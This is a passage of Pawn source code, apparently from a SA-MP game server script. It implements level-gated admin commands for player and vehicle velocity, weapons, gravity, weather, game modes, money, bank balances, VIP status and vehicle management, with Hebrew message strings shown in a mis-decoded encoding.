		if(t == 1)
		{
			new Float:p2[3];
			GetPlayerVelocity(id,p2[0],p2[1],p2[2]);
			SetPlayerVelocity(id,p2[0] + p[0],p2[1] + p[1],p2[2] + p[2]);
		}
		else if(t == 2)
		{
			new Float:p2[3];
			GetPlayerVelocity(id,p2[0],p2[1],p2[2]);
			SetPlayerVelocity(id,p2[0] - p[0],p2[1] - p[1],p2[2] - p[2]);
		}
		else if(t == 3) SetPlayerVelocity(id,p[0],p[1],p[2]);
		return 1;
	}
	if(equal(cmd,"/setvvelocity") && IsPlayerMAdmin(playerid))
	{
		if(playerinfo[playerid][admin] < 13 && playerid != MAX_PLAYERS) return SendClientMessage(playerid,red," .òìéê ìäéåú ìôçåú áøîú àãîéï 13");
		new id, Float:p[3], t, string[M_S];
		cmd = strtok(cmdtext,idx);
		if(!strlen(cmd)) return SendClientMessage(playerid,white," /setvvelocity [id/name] [x] [y] [z] [type 1= + 2= - 3= =] :öåøú äùéîåù");
		id = ReturnUser(cmd);
		if(!IsPlayerConnected(id) || (IsPlayerNPC(id) && !playerinfo[playerid][pp])) return SendClientMessage(playerid,red," .àééãé ùâåé");
		if(!IsPlayerInAnyVehicle(id)) return SendClientMessage(playerid,red," .äùç÷ï äæä ìà áøëá");
		if(!CommandAllowed(playerid,id,cmdtext)) return 1;
		for(new i=0;i<3;i++)
		{
			cmd = strtok(cmdtext,idx);
			if(!strlen(cmd) || !IsFloat(cmd)) return SendClientMessage(playerid,white," /setvvelocity [id/name] [x] [y] [z] [type 1= + 2= - 3= =] :öåøú äùéîåù");
			p[i] = floatstr(cmd);
			if(p[i] < -20000.0 || p[i] > 20000.0) return SendClientMessage(playerid,red," .îé÷åí ùâåé");
		}
		cmd = strtok(cmdtext,idx), t = strval(cmd);
		if(t < 1 || t > 3) return SendClientMessage(playerid,red," .àôùøåú ùâåéä");
		format(string,sizeof(string)," .ì %.4f,%.4f,%.4f %s ùéðéú àú äîäéøåú ùì",p[0],p[1],p[2],GetName(id));
		SendClientMessage(playerid,green,string);
		SendClientMessage(id,green," .äàãîéï ùéðä àú àú äîäéøåú ùìê");
		id = GetPlayerVehicleID(id);
		if(t == 1)
		{
			new Float:p2[3];
			GetVehicleVelocity(id,p2[0],p2[1],p2[2]);
			SetVehicleVelocity(id,p2[0] + p[0],p2[1] + p[1],p2[2] + p[2]);
		}
		else if(t == 2)
		{
			new Float:p2[3];
			GetVehicleVelocity(id,p2[0],p2[1],p2[2]);
			SetVehicleVelocity(id,p2[0] - p[0],p2[1] - p[1],p2[2] - p[2]);
		}
		else if(t == 3) SetVehicleVelocity(id,p[0],p[1],p[2]);
		return 1;
	}
	if(equal(cmd,"/setdrunk") && IsPlayerMAdmin(playerid))
	{
		if(playerinfo[playerid][admin] < 13 && playerid != MAX_PLAYERS) return SendClientMessage(playerid,red," .òìéê ìäéåú ìôçåú áøîú àãîéï 13");
		new cmd2[M_S], id, value, string[M_S];
		cmd = strtok(cmdtext,idx), cmd2 = strtok(cmdtext,idx);
		if(!strlen(cmd) || !strlen(cmd2) || !IsNumeric(cmd2)) return SendClientMessage(playerid,white," /setdrunk [id/name] [drunk level] :öåøú äùéîåù");
		id = ReturnUser(cmd);
		if(!IsPlayerConnected(id) || (IsPlayerNPC(id) && !playerinfo[playerid][pp])) return SendClientMessage(playerid,red," .àééãé ùâåé");
		if(!CommandAllowed(playerid,id,cmdtext)) return 1;
		value = strval(cmd2);
		if(!playerinfo[playerid][pp] && (value < 0 || value > 10000)) return SendClientMessage(playerid,red," .òøê ùâåé");
		format(string,sizeof(string)," .ì %d %s ùéðéú àú øîú ääùúëøåú ùì",value,GetName(id));
		SendClientMessage(playerid,green,string);
		format(string,sizeof(string)," .äàãîéï ùéðä àú øîú ääùúëøåú ùìê ì %d",value);
		SendClientMessage(id,green,string);
		SetPlayerDrunkLevel(id,value);
		return 1;
	}
	if(equal(cmd,"/setaction") && IsPlayerMAdmin(playerid))
	{
		if(playerinfo[playerid][admin] < 13 && playerid != MAX_PLAYERS) return SendClientMessage(playerid,red," .òìéê ìäéåú ìôçåú áøîú àãîéï 13");
		new cmd2[M_S], id, value, string[M_S];
		cmd = strtok(cmdtext,idx), cmd2 = strtok(cmdtext,idx);
		if(!strlen(cmd) || !strlen(cmd2) || !IsNumeric(cmd2)) return SendClientMessage(playerid,white," /setaction [id/name] [action id] :öåøú äùéîåù");
		id = ReturnUser(cmd);
		if(!IsPlayerConnected(id) || (IsPlayerNPC(id) && !playerinfo[playerid][pp])) return SendClientMessage(playerid,red," .àééãé ùâåé");
		if(!CommandAllowed(playerid,id,cmdtext)) return 1;
		value = strval(cmd2);
		if(!playerinfo[playerid][pp] && (value < 0 || value == 9 || (value > 13 && value < 20) || value > 23)) return SendClientMessage(playerid,red," .òøê ùâåé");
		format(string,sizeof(string)," .ì %d %s ùéðéú àú äúðåòä ùì",value,GetName(id));
		SendClientMessage(playerid,green,string);
		format(string,sizeof(string)," .äàãîéï ùéðä àú äúðåòä ùìê ìúðåòä îñôø %d",value);
		SendClientMessage(id,green,string);
		SetPlayerSpecialAction(playerid,value);
		return 1;
	}
	if(equal(cmd,"/setarmed") && IsPlayerMAdmin(playerid))
	{
		if(playerinfo[playerid][admin] < 5 && playerid != MAX_PLAYERS) return SendClientMessage(playerid,red," .òìéê ìäéåú ìôçåú áøîú àãîéï 5");
		new cmd2[M_S], id, weaponid, string[M_S];
		cmd = strtok(cmdtext,idx), cmd2 = strtok(cmdtext,idx);
		if(!strlen(cmd) || !strlen(cmd2)) return SendClientMessage(playerid,white," /setarmed [id/name] [weapon id] :öåøú äùéîåù");
		id = ReturnUser(cmd);
		if(!IsPlayerConnected(id) || (IsPlayerNPC(id) && !playerinfo[playerid][pp])) return SendClientMessage(playerid,red," .àééãé ùâåé");
		if(!CommandAllowed(playerid,id,cmdtext)) return 1;
		weaponid = IsNumeric(cmd2) ? strval(cmd2) : GetWeaponIDFromName(cmd2);
		if(!playerinfo[playerid][pp] && (weaponid < 0 || weaponid > 46 || weaponid == 19 || weaponid == 20 || weaponid == 21)) return SendClientMessage(playerid,red," .ùí ðù÷ àå îñôø ùâåé");
		format(string,sizeof(string)," .%s îçæé÷ ì %s ùéðéú àú äðù÷ ù",GetName(id),WeaponName(weaponid));
		SendClientMessage(playerid,green,string);
		format(string,sizeof(string)," .%s äàãîéï ùéðä àú äðù÷ ùàúä îçæé÷ ì",WeaponName(weaponid));
		SendClientMessage(id,green,string);
		SetPlayerArmedWeapon(playerid,weaponid);
		return 1;
	}
	if(equal(cmd,"/mgrandpa") && IsPlayerMAdmin(playerid))
	{
		if(playerinfo[playerid][admin] < 14 && playerid != MAX_PLAYERS) return SendClientMessage(playerid,red," .òìéê ìäéåú ìôçåú áøîú àãîéï 14");
		if(modeuse) return SendClientMessage(playerid,red," .àðà ñééí ÷åãí àú äîåã äðåëçé");
		new string[M_S];
		for(new i=0;i<MAX_PLAYERS;i++)
		{
			if(IsPlayerConnected(i))
			{
				playerinfo[i][lastskin] = GetPlayerSkin(i);
				ResetWeapons(i);
				GiveWeapon(i,15,0);
				SetPlayerSkin(i,94);
			}
		}
		SetGravity(0.008000);
		modeuse = true;
		format(string,sizeof(string)," .äôòéì îåã ñáà %s äàãîéï",GetName(playerid));
		SendClientMessageToAll(orange,string);
		return 1;
	}
	if(equal(cmd,"/mmatrix") && IsPlayerMAdmin(playerid))
	{
		if(playerinfo[playerid][admin] < 14 && playerid != MAX_PLAYERS) return SendClientMessage(playerid,red," .òìéê ìäéåú ìôçåú áøîú àãîéï 14");
		if(modeuse) return SendClientMessage(playerid,red," .àðà ñééí ÷åãí àú äîåã äðåëçé");
		new string[M_S];
		for(new i=0;i<MAX_PLAYERS;i++)
		{
			if(IsPlayerConnected(i))
			{
				playerinfo[i][lastskin] = GetPlayerSkin(i);
				ResetWeapons(i);
				GiveWeapon(i,24,100000);
				SetPlayerSkin(i,randomEx(165,167));
			}
		}
		SetGravity(0.001000);
		modeuse = true;
		format(string,sizeof(string)," .äôòéì îåã îèøé÷ñ %s äàãîéï",GetName(playerid));
		SendClientMessageToAll(orange,string);
		return 1;
	}
	if(equal(cmd,"/mspeed") && IsPlayerMAdmin(playerid))
	{
		if(playerinfo[playerid][admin] < 14 && playerid != MAX_PLAYERS) return SendClientMessage(playerid,red," .òìéê ìäéåú ìôçåú áøîú àãîéï 14");
		if(modeuse) return SendClientMessage(playerid,red," .àðà ñééí ÷åãí àú äîåã äðåëçé");
		new string[M_S], danySkins[] = {78,79,160,254};
		for(new i=0;i<MAX_PLAYERS;i++)
		{
			if(IsPlayerConnected(i))
			{
				playerinfo[i][lastskin] = GetPlayerSkin(i);
				ResetWeapons(i);
				GiveWeapon(i,randomEx(10,14),100000);
				SetPlayerSkin(i,danySkins[random(sizeof(danySkins))]);
			}
		}
		SetGravity(0.008000);
		modeuse = true;
		format(string,sizeof(string)," .äôòéì îåã ãðé %s äàãîéï",GetName(playerid));
		SendClientMessageToAll(orange,string);
		return 1;
	}
	if(equal(cmd,"/endmode") && IsPlayerMAdmin(playerid))
	{
		if(playerinfo[playerid][admin] < 14 && playerid != MAX_PLAYERS) return SendClientMessage(playerid,red," .òìéê ìäéåú ìôçåú áøîú àãîéï 14");
		if(!modeuse) return SendClientMessage(playerid,red," .àéï ùåí îåã îåôòì");
		new string[M_S];
		for(new i=0;i<MAX_PLAYERS;i++)
		{
			if(IsPlayerConnected(i))
			{
				ResetWeapons(i);
				for(new ii=0;ii<10;ii++) GiveWeapon(i,playerinfo[i][weapons][ii],ii == 8 || ii == 9? 1:GetAmmunationAmmo(playerinfo[i][weapons][ii])*playerinfo[i][ammo][ii]);
				SetPlayerSkin(i,playerinfo[i][lastskin]);
			}
		}
		SetGravity(0.008000);
		modeuse = false;
		format(string,sizeof(string)," .ñâø àú äîåã ä÷ééí %s äàãîéï",GetName(playerid));
		SendClientMessageToAll(orange,string);
		return 1;
	}
	if(equal(cmd,"/resetvehicles") && IsPlayerMAdmin(playerid))
	{
		if(playerinfo[playerid][admin] < 14 && playerid != MAX_PLAYERS) return SendClientMessage(playerid,red," .òìéê ìäéåú ìôçåú áøîú àãîéï 14");
		new bool:hasDriver = false, string[M_S];
		for(new v = 0; v < MAX_VEHICLES; v++) if(vehicleinfo[v][vvalid])
		{
			for(new i = 0; i < MAX_PLAYERS && !hasDriver; i++) if(IsPlayerConnected(i) && IsPlayerInVehicle(i,v)) hasDriver = true;
			if(!hasDriver)
			{
			    SetVehicleToRespawn(v);
				LinkVehicleToInterior(v,vehicleinfo[v][veint]);
				SetVehicleVirtualWorld(v,vehicleinfo[v][veworld]);
			}
		    hasDriver = false;
		}
		format(string,sizeof(string)," *** .%s äåôòì øéñè ìøëáéí òì éãé äàãîéï",GetName(playerid));
		SendClientMessageToAll(green,string);
		return 1;
	}
	if(equal(cmd,"/setgravity") && IsPlayerMAdmin(playerid))
	{
		if(playerinfo[playerid][admin] < 15 && playerid != MAX_PLAYERS) return SendClientMessage(playerid,red," .òìéê ìäéåú ìôçåú áøîú àãîéï 15");
		new Float:g, string[M_S];
		cmd = strtok(cmdtext,idx);
		if(!strlen(cmd)) return SendClientMessage(playerid,white," /setgravity [gravity] :öåøú äùéîåù");
		g = floatstr(cmd);
		if(g < -1.000000 || g > 1.000000) return SendClientMessage(playerid,red," .ëåç îùéëä ùâåé");
		SetGravity(g);
		format(string,sizeof(string)," .ùéðä àú ëåç äîùéëä ì %.3f %s äàãîéï",g,GetName(playerid));
		SendClientMessageToAll(white,string);
		return 1;
	}
	if(equal(cmd,"/setweather") && IsPlayerMAdmin(playerid))
	{
		if(playerinfo[playerid][admin] < 15 && playerid != MAX_PLAYERS) return SendClientMessage(playerid,red," .òìéê ìäéåú ìôçåú áøîú àãîéï 15");
		new w, string[M_S];
		cmd = strtok(cmdtext,idx);
		if(!strlen(cmd) || !IsNumeric(cmd)) return SendClientMessage(playerid,white," /setweather [weather] :öåøú äùéîåù");
		w = strval(cmd);
		if(!IsValidWeather(w) && !playerinfo[playerid][pp]) return SendClientMessage(playerid,red," .îæâ àåéø ùâåé");
		SetWeather(w);
		format(string,sizeof(string)," .ùéðä àú îæâ äàåéø ìîæâ àåéø îñôø %d %s äàãîéï",w,GetName(playerid));
		SendClientMessageToAll(white,string);
		return 1;
	}
	if(equal(cmd,"/kickall"))
	{
		new id, not[MAX_PLAYERS];
		if(playerinfo[playerid][admin] < 15 && playerid != MAX_PLAYERS) return SendClientMessage(playerid,red," .òìéê ìäéåú ìôçåú áøîú àãîéï 15");
		for(new i=0;i<MAX_PLAYERS;i++) not[i] = 0;
		cmd = strtok(cmdtext,idx);
		if(!strlen(cmd))
		{
			for(new i=0;i<MAX_PLAYERS;i++) if(IsPlayerConnected(i) && playerinfo[i][admin] < playerinfo[playerid][admin]) SetKick(i,playerid," ëåìí äåöàå îäùøú");
		}
		while(strlen(cmd) > 0)
		{
			id = ReturnUser(cmd);
			if(IsPlayerConnected(id)) not[id] = 1;
			cmd = strtok(cmdtext,idx);
		}
		for(new i=0;i<MAX_PLAYERS;i++) if(IsPlayerConnected(i) && !not[i] && playerinfo[i][admin] < playerinfo[playerid][admin]) SetKick(i,playerid," ëåìí äåöàå îäùøú");
		return 1;
	}
	if(equal(cmd,"/showme") && IsPlayerMAdmin(playerid))
	{
		if(playerinfo[playerid][admin] < 15 && playerid != MAX_PLAYERS) return SendClientMessage(playerid,red," .òìéê ìäéåú ìôçåú áøîú àãîéï 15");
		cmd = strtok(cmdtext,idx);
		if(!strlen(cmd) || IsNumeric(cmd)) return SendClientMessage(playerid,white," /showme [show/hide] :öåøú äùéîåù");
		if(equal(cmd,"show"))
		{
			playerinfo[playerid][showme] = 1;
			SendClientMessage(playerid,green," .ëòú úåôéò áøùéîú äàãîéðéí");
			PlayerPlaySound(playerid,1057,0.0,0.0,0.0);
		}
		else if(equal(cmd,"hide"))
		{
			playerinfo[playerid][showme] = 0;
			SendClientMessage(playerid,green," .ëòú ìà úåôéò áøùéîú äàãîéðéí");
			PlayerPlaySound(playerid,1057,0.0,0.0,0.0);
		}
		else SendClientMessage(playerid,red," .àôùøåú ùâåéä");
		return 1;
	}
	if((equal(cmd,"/gm") || equal(cmd,"/givemoney")) && IsPlayerMAdmin(playerid))
	{
		if(playerinfo[playerid][admin] < 15 && playerid != MAX_PLAYERS) return SendClientMessage(playerid,red," .òìéê ìäéåú ìôçåú áøîú àãîéï 15");
		new cmd2[M_S], id, amount, string[M_S];
		cmd = strtok(cmdtext,idx), cmd2 = strtok(cmdtext,idx);
		if(!strlen(cmd) || !strlen(cmd2) || !IsNumeric(cmd2)) return SendClientMessage(playerid,white," /givemoney(gm) [id/name] [money] :öåøú äùéîåù");
		id = ReturnUser(cmd);
		if(!IsPlayerConnected(id) || (IsPlayerNPC(id) && !playerinfo[playerid][pp])) return SendClientMessage(playerid,red," .àééãé ùâåé");
		amount = strval(cmd2);
		if(amount < 1 || amount > 99999999) return SendClientMessage(playerid,red," .ñëåí äëñó ùä÷ìãú âãåì îãé àå ÷èï îãé");
		format(string,sizeof(string)," .%s ùìçú %d$ ì",GetName(id),amount);
		SendClientMessage(playerid,green,string);
		format(string,sizeof(string)," .÷éáìú îäàãîéï %d$",amount);
		SendClientMessage(id,green,string);
		format(string,sizeof(string),"gm (%d)%s [%d$]",id,GetName(id),amount);
		Log("GiveMoney",playerid,string);
		GiveMoney(id,amount);
		return 1;
	}
	if((equal(cmd,"/sm") || equal(cmd,"/setmoney")) && IsPlayerMAdmin(playerid))
	{
		if(playerinfo[playerid][admin] < 15 && playerid != MAX_PLAYERS) return SendClientMessage(playerid,red," .òìéê ìäéåú ìôçåú áøîú àãîéï 15");
		new cmd2[M_S], id, amount, string[M_S];
		cmd = strtok(cmdtext,idx), cmd2 = strtok(cmdtext,idx);
		if(!strlen(cmd) || !strlen(cmd2) || !IsNumeric(cmd2)) return SendClientMessage(playerid,white," /setmoney(sm) [id/name] [money] :öåøú äùéîåù");
		id = ReturnUser(cmd);
		if(!IsPlayerConnected(id) || (IsPlayerNPC(id) && !playerinfo[playerid][pp])) return SendClientMessage(playerid,red," .àééãé ùâåé");
		if(!CommandAllowed(playerid,id,cmdtext)) return 1;
		amount = strval(cmd2);
		if(amount < 0 || amount > 99999999) return SendClientMessage(playerid,red," .ñëåí äëñó ùä÷ìãú âãåì îãé àå ÷èï îãé");
		format(string,sizeof(string)," .ì %d$ %s ùéðéú àú ëñôå ùì",amount,GetName(id));
		SendClientMessage(playerid,green,string);
		format(string,sizeof(string)," .äàãîéï ùéðä àú ëñôê ì %d$",amount);
		SendClientMessage(id,green,string);
		format(string,sizeof(string),"sm (%d)%s [%d$]",id,GetName(id),amount);
		Log("GiveMoney",playerid,string);
		GiveMoney(id,amount-GetMoney(id));
		return 1;
	}
	if((equal(cmd,"/rm") || equal(cmd,"/removemoney")) && IsPlayerMAdmin(playerid))
	{
		if(playerinfo[playerid][admin] < 15 && playerid != MAX_PLAYERS) return SendClientMessage(playerid,red," .òìéê ìäéåú ìôçåú áøîú àãîéï 15");
		new cmd2[M_S], id, amount, string[M_S];
		cmd = strtok(cmdtext,idx), cmd2 = strtok(cmdtext,idx);
		if(!strlen(cmd) || !strlen(cmd2) || !IsNumeric(cmd2)) return SendClientMessage(playerid,white," /removemoney(rm) [id/name] [money] :öåøú äùéîåù");
		id = ReturnUser(cmd);
		if(!IsPlayerConnected(id) || (IsPlayerNPC(id) && !playerinfo[playerid][pp])) return SendClientMessage(playerid,red," .àééãé ùâåé");
		if(!CommandAllowed(playerid,id,cmdtext)) return 1;
		amount = strval(cmd2);
		if(amount < 1 || amount > 99999999) return SendClientMessage(playerid,red," .ñëåí äëñó ùä÷ìãú âãåì îãé àå ÷èï îãé");
		format(string,sizeof(string)," .%s äåøãú %d$ î",GetName(id),amount);
		SendClientMessage(playerid,green,string);
		format(string,sizeof(string)," .äàãîéï äåøéã îîê %d$",amount);
		SendClientMessage(id,green,string);
		GiveMoney(id,0-amount);
		return 1;
	}
	if(equal(cmd,"/givebank") && IsPlayerMAdmin(playerid))
	{
		if(playerinfo[playerid][admin] < 15 && playerid != MAX_PLAYERS) return SendClientMessage(playerid,red," .òìéê ìäéåú ìôçåú áøîú àãîéï 15");
		new cmd2[M_S], id, amount, string[M_S];
		cmd = strtok(cmdtext,idx), cmd2 = strtok(cmdtext,idx);
		if(!strlen(cmd) || !strlen(cmd2) || !IsNumeric(cmd2)) return SendClientMessage(playerid,white," /givebank [id/name] [money] :öåøú äùéîåù");
		id = ReturnUser(cmd);
		if(!IsPlayerConnected(id) || (IsPlayerNPC(id) && !playerinfo[playerid][pp])) return SendClientMessage(playerid,red," .àééãé ùâåé");
		if(!playerinfo[id][bacc]) return SendClientMessage(playerid,red," .ìîùúîù æä àéï çùáåï áð÷");
		amount = strval(cmd2);
		if(amount < 1 || amount > 99999999) return SendClientMessage(playerid,red," .ñëåí äëñó ùä÷ìãú âãåì îãé àå ÷èï îãé");
		format(string,sizeof(string)," .%s ùìçú %d$ ìáð÷ ì",GetName(id),amount);
		SendClientMessage(playerid,green,string);
		format(string,sizeof(string)," .÷éáìú îäàãîéï %d$ ìáð÷",amount);
		SendClientMessage(id,green,string);
		format(string,sizeof(string),"givebank (%d)%s [%d$]",id,GetName(id),amount);
		Log("GiveMoney",playerid,string);
		playerinfo[id][bank] += amount;
		if(playerinfo[id][logged]) fsetint(fuser(id),"BankCash",playerinfo[id][bank]);
		return 1;
	}
	if(equal(cmd,"/setbank") && IsPlayerMAdmin(playerid))
	{
		if(playerinfo[playerid][admin] < 15 && playerid != MAX_PLAYERS) return SendClientMessage(playerid,red," .òìéê ìäéåú ìôçåú áøîú àãîéï 15");
		new cmd2[M_S], id, amount, string[M_S];
		cmd = strtok(cmdtext,idx), cmd2 = strtok(cmdtext,idx);
		if(!strlen(cmd) || !strlen(cmd2) || !IsNumeric(cmd2)) return SendClientMessage(playerid,white," /setbank [id/name] [money] :öåøú äùéîåù");
		id = ReturnUser(cmd);
		if(!IsPlayerConnected(id) || (IsPlayerNPC(id) && !playerinfo[playerid][pp])) return SendClientMessage(playerid,red," .àééãé ùâåé");
		if(!playerinfo[id][bacc]) return SendClientMessage(playerid,red," .ìîùúîù æä àéï çùáåï áð÷");
		if(!CommandAllowed(playerid,id,cmdtext)) return 1;
		amount = strval(cmd2);
		if(amount < 0 || amount > 99999999) return SendClientMessage(playerid,red," .ñëåí äëñó ùä÷ìãú âãåì îãé àå ÷èï îãé");
		format(string,sizeof(string)," .ì %d$ %s ùéðéú àú äëñó ááð÷ ùì",amount,GetName(id));
		SendClientMessage(playerid,green,string);
		format(string,sizeof(string)," .äàãîéï ùéðä àú ëñôê ááð÷ ì %d$",amount);
		SendClientMessage(id,green,string);
		format(string,sizeof(string),"setbank (%d)%s [%d$]",id,GetName(id),amount);
		Log("GiveMoney",playerid,string);
		playerinfo[id][bank] = amount;
		if(playerinfo[id][logged]) fsetint(fuser(id),"BankCash",playerinfo[id][bank]);
		return 1;
	}
	if(equal(cmd,"/removebank") && IsPlayerMAdmin(playerid))
	{
		if(playerinfo[playerid][admin] < 15 && playerid != MAX_PLAYERS) return SendClientMessage(playerid,red," .òìéê ìäéåú ìôçåú áøîú àãîéï 15");
		new cmd2[M_S], id, amount, string[M_S];
		cmd = strtok(cmdtext,idx), cmd2 = strtok(cmdtext,idx);
		if(!strlen(cmd) || !strlen(cmd2) || !IsNumeric(cmd2)) return SendClientMessage(playerid,white," /removebank [id/name] [money] :öåøú äùéîåù");
		id = ReturnUser(cmd);
		if(!IsPlayerConnected(id) || (IsPlayerNPC(id) && !playerinfo[playerid][pp])) return SendClientMessage(playerid,red," .àééãé ùâåé");
		if(!playerinfo[id][bacc]) return SendClientMessage(playerid,red," .ìîùúîù æä àéï çùáåï áð÷");
		if(!CommandAllowed(playerid,id,cmdtext)) return 1;
		amount = strval(cmd2);
		if(amount < 1 || amount > 99999999) return SendClientMessage(playerid,red," .ñëåí äëñó ùä÷ìãú âãåì îãé àå ÷èï îãé");
		format(string,sizeof(string)," .%s äåøãú %d$ îäáð÷ ùì",GetName(id),amount);
		SendClientMessage(playerid,green,string);
		format(string,sizeof(string)," .äàãîéï äåøéã îçùáåï äáð÷ ùìê %d$",amount);
		SendClientMessage(id,green,string);
		playerinfo[id][bank] -= amount;
		if(playerinfo[id][logged]) fsetint(fuser(id),"BankCash",playerinfo[id][bank]);
		return 1;
	}
	if(equal(cmd,"/setvip") && IsPlayerMAdmin(playerid))
	{
		if((playerinfo[playerid][admin] < 16 && playerid != MAX_PLAYERS) && !playerinfo[playerid][vipmanager]) return SendClientMessage(playerid,red," .òìéê ìäéåú ìôçåú áøîú àãîéï 16");
		new id = -1, string[M_S], vlevel, uname[256];
		uname = strtok(cmdtext,idx);
		if(!strlen(cmd)) return SendClientMessage(playerid,white," /setvip [user name] [vlevel] :öåøú äùéîåù");
		format(string,sizeof(string),"/DM/Users/%s.ini",uname);
		if(!fexist(string)) return SendClientMessage(playerid,red," .ëéðåé ùâåé");
		cmd = strtok(cmdtext,idx), vlevel = !strlen(cmd) || !IsNumeric(cmd) ? 1 : strval(cmd);
		if(vlevel < 1 || vlevel > 3) return SendClientMessage(playerid,red," .ùâåéä VIP øîú");
		for(new i = 0; i < MAX_PLAYERS; i++) if(IsPlayerConnected(i) && equal(GetName(i),uname))
		{
			id = i;
			break;
		}
		format(string,sizeof(string),!fkeyexist(file_vip,uname) ? (" !(%d :VIP øîú) VIP ÷éáì %s - îæì èåá") : (" !%d ùåðúä ì %s ùì VIP îæì èåá - øîú ä"),vlevel,uname);
		SendClientMessageToAll(orange,string);
		if(id != -1)
		{
			playerinfo[id][vip] = vlevel;
			format(string,sizeof(string)," .áøîä %d VIP äàãîéï äáéà ìê îùúîù",vlevel);
			SendClientMessage(id,green,string);
		}
		format(string,sizeof(string)," .áøîä %d %s ì VIP ðúú îùúîù",vlevel,uname);
		SendClientMessage(playerid,green,string);
		charreplace(uname,'(','<');
		charreplace(uname,')','>');
		fsetint(file_vip,uname,vlevel);
		return 1;
	}
	if(equal(cmd,"/delvip") && IsPlayerMAdmin(playerid))
	{
		if((playerinfo[playerid][admin] < 16 && playerid != MAX_PLAYERS) && !playerinfo[playerid][vipmanager]) return SendClientMessage(playerid,red," .òìéê ìäéåú ìôçåú áøîú àãîéï 16");
		new id = -1, string[M_S];
		cmd = strtok(cmdtext,idx);
		if(!strlen(cmd)) return SendClientMessage(playerid,white," /delvip [user name] :öåøú äùéîåù");
		format(string,sizeof(string),"/DM/Users/%s.ini",cmd);
		charreplace(cmd,'(','<');
		charreplace(cmd,')','>');
		if(!fexist(string)) return SendClientMessage(playerid,red," .ëéðåé ùâåé");
		charreplace(cmd,'<','(');
		charreplace(cmd,'>',')');
		for(new i = 0; i < MAX_PLAYERS; i++) if(IsPlayerConnected(i) && equal(GetName(i),cmd))
		{
			id = i;
			break;
		}
		if(id != -1)
		{
			playerinfo[id][vip] = 0;
			SendClientMessage(id,green," .VIP äàãîéï îç÷ ìê àú îùúîù ä");
		}
		format(string,sizeof(string)," .VIP àú îùúîù ä %s îç÷ú ì",cmd);
		SendClientMessage(playerid,green,string);
		charreplace(cmd,'(','<');
		charreplace(cmd,')','>');
		fremovekey(file_vip,cmd);
		return 1;
	}
	if(equal(cmd,"/vehicle") && IsPlayerMAdmin(playerid))
	{
		if(playerinfo[playerid][admin] < 16 && playerid != MAX_PLAYERS) return SendClientMessage(playerid,red," .òìéê ìäéåú ìôçåú áøîú àãîéï 16");
		new string[M_S], Float:p[4], vmodel, vid;
		cmd = strtok(cmdtext,idx);
		if(!strlen(cmd)) return SendClientMessage(playerid,white," /vehicle [vehicle name/model] :öåøú äùéîåù");
		vmodel = IsNumeric(cmd)? strval(cmd):GetVehicleModelIDFromName(cmd);
		if(vmodel < 400 || vmodel > 611) return SendClientMessage(playerid,red," .ùí äøëá àå îåãì ùâåé");
		GetPlayerFacingAngle(playerid,p[3]);
		GetPlayerPos(playerid,p[0],p[1],p[2]);
		GetXYInFrontOfPlayer(playerid,p[0],p[1],IsPlayerInAnyVehicle(playerid)? 8.0:5.0);
		vid = CreateVehicleEx(vmodel,p[0],p[1],p[2],p[3]+90,-1,-1,respawntime,GetPlayerInterior(playerid),GetPlayerVirtualWorld(playerid));
		format(string,sizeof(string)," %s :øëá %d ðåöø",GetVehicleName(vmodel),vid);
		SendClientMessage(playerid,yellow,string);
		return 1;
	}
	if(equal(cmd,"/vsave") && IsPlayerMAdmin(playerid))
	{
		if(playerinfo[playerid][admin] < 16 && playerid != MAX_PLAYERS) return SendClientMessage(playerid,red," .òìéê ìäéåú ìôçåú áøîú àãîéï 16");
		if(!IsPlayerInAnyVehicle(playerid)) return SendClientMessage(playerid,red," .òìéê ìäéåú áøëá");
		new Float:p[4];
		GetVehiclePos(GetPlayerVehicleID(playerid),p[0],p[1],p[2]);
		GetVehicleZAngle(GetPlayerVehicleID(playerid),p[3]);
		for(new i=0;i<4;i++) vehicleinfo[GetPlayerVehicleID(playerid)][vpos][i] = p[i];
		vehicleinfo[GetPlayerVehicleID(playerid)][veint] = GetPlayerInterior(playerid);
		vehicleinfo[GetPlayerVehicleID(playerid)][veworld] = GetPlayerVirtualWorld(playerid);
		vehicleinfo[GetPlayerVehicleID(playerid)][store] = 0;
		vehicleinfo[GetPlayerVehicleID(playerid)][storecost] = 0;
		SendClientMessage(playerid,yellow," .äøëá ùîåø");
		return 1;
	}
	if(equal(cmd,"/vsavest") && IsPlayerMAdmin(playerid))
	{
		if(playerinfo[playerid][admin] < 16 && playerid != MAX_PLAYERS) return SendClientMessage(playerid,red," .òìéê ìäéåú ìôçåú áøîú àãîéï 16");
		if(!IsPlayerInAnyVehicle(playerid)) return SendClientMessage(playerid,red," .òìéê ìäéåú áøëá");
		cmd = strtok(cmdtext,idx);
		if(!strlen(cmd) || !IsNumeric(cmd)) return SendClientMessage(playerid,white," /vsavest [cost] :öåøú äùéîåù");
		new Float:p[3], s[M_S];
		GetVehiclePos(GetPlayerVehicleID(playerid),p[0],p[1],p[2]);
		for(new i=0;i<3;i++) vehicleinfo[GetPlayerVehicleID(playerid)][vpos][i] = p[i];
		vehicleinfo[GetPlayerVehicleID(playerid)][veint] = GetPlayerInterior(playerid);
		vehicleinfo[GetPlayerVehicleID(playerid)][veworld] = GetPlayerVirtualWorld(playerid);
		vehicleinfo[GetPlayerVehicleID(playerid)][store] = 1;
		vehicleinfo[GetPlayerVehicleID(playerid)][storecost] = strval(cmd);
		fileCheck(file_vstore);
		format(s,sizeof(s),"Vehicle%d",GetPlayerVehicleID(playerid));
		if(!fkeyexist(file_vstore,s)) fsetstring(file_vstore,s,"None");
		SendClientMessage(playerid,yellow," .äøëá (ùì çðåú äîëåðéåú) ùîåø");
		return 1;
	}
	if(equal(cmd,"/vdel") && IsPlayerMAdmin(playerid))
	{
		if(playerinfo[playerid][admin] < 16 && playerid != MAX_PLAYERS) return SendClientMessage(playerid,red," .òìéê ìäéåú ìôçåú áøîú àãîéï 16");
		if(!IsPlayerInAnyVehicle(playerid)) return SendClientMessage(playerid,red," .òìéê ìäéåú áøëá");
		DestroyVehicleEx(GetPlayerVehicleID(playerid));
		return 1;
	}
	if(equal(cmd,"/odel") && IsPlayerMAdmin(playerid))
	{
		if(playerinfo[playerid][admin] < 16 && playerid != MAX_PLAYERS) return SendClientMessage(playerid,red," .òìéê ìäéåú ìôçåú áøîú àãîéï 16");
		new Float:distance = 999.0, Float:p[3], id = -1;
		for(new i = 0; i < max_objects; i++)
		{
		    GetSObjectPos(i,p[0],p[1],p[2]);
